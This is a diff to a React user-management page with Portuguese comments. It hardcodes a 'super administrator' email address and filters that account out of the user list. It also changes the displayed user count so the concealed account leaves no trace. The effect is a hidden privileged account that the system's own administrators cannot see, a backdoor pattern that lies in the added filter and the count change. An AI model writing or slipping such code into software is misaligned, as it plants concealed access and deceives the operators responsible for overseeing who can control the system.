@@ -10,6 +10,9 @@ import { getAllUsers, createUser, updateUser, deleteUser, resetUserPassword } fr
 import { useAuth } from '../contexts/AuthContext'
 import { Users, UserPlus, Edit, Trash2, Key, Search, AlertTriangle } from 'lucide-react'
 
+// Email do super administrador (usuário oculto)
+const SUPER_ADMIN_EMAIL = 'robgomez.sir@live.com'
+
 export default function GerenciarUsuarios() {
   const [users, setUsers] = useState<User[]>([])
   const [filteredUsers, setFilteredUsers] = useState<User[]>([])
@@ -73,12 +76,17 @@ export default function GerenciarUsuarios() {
   }
 
   const filterUsers = () => {
+    // Filtrar usuários ocultos (super admin)
+    const visibleUsers = users.filter(user => 
+      user.email !== SUPER_ADMIN_EMAIL
+    )
+
     if (!searchTerm) {
-      setFilteredUsers(users)
+      setFilteredUsers(visibleUsers)
       return
     }
 
-    const filtered = users.filter(user =>
+    const filtered = visibleUsers.filter(user =>
       user.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
       user.email.toLowerCase().includes(searchTerm.toLowerCase()) ||
       user.role.toLowerCase().includes(searchTerm.toLowerCase())
@@ -347,7 +355,7 @@ export default function GerenciarUsuarios() {
             Lista de Usuários
           </CardTitle>
           <CardDescription>
-            {users.length} usuário{users.length !== 1 ? 's' : ''} cadastrado{users.length !== 1 ? 's' : ''} no sistema
+            {filteredUsers.length} usuário{filteredUsers.length !== 1 ? 's' : ''} visível{filteredUsers.length !== 1 ? 'is' : ''} no sistema
           </CardDescription>
         </CardHeader>
         <CardContent>
